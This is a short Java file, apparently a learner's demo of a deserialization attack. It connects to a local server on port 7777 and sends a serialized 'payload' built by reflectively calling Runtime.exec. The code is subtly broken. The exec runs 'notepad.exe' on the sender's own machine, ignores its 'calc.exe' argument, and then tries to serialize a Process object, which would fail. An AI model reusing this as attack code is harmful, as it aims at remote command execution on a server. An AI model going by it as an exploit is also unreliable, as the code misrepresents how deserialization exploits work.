package Server;


import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Payload1 {
    public static void main(String[] args) throws Exception{
        String host = "127.0.0.1";
        int port = 7777;
        Socket client = new Socket(host, port);

        OutputStream outputStream= client.getOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
        objectOutputStream.writeObject(getPayload("calc.exe"));
        objectOutputStream.flush();
        objectOutputStream.close();

    }
    private static Object getPayload(String cmd) throws  Exception{
        Object runtime = Class.forName("java.lang.Runtime").getMethod("getRuntime", new Class[]{}).invoke(null);
        Object evil = Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(runtime, "notepad.exe");
        return evil;
    }
}
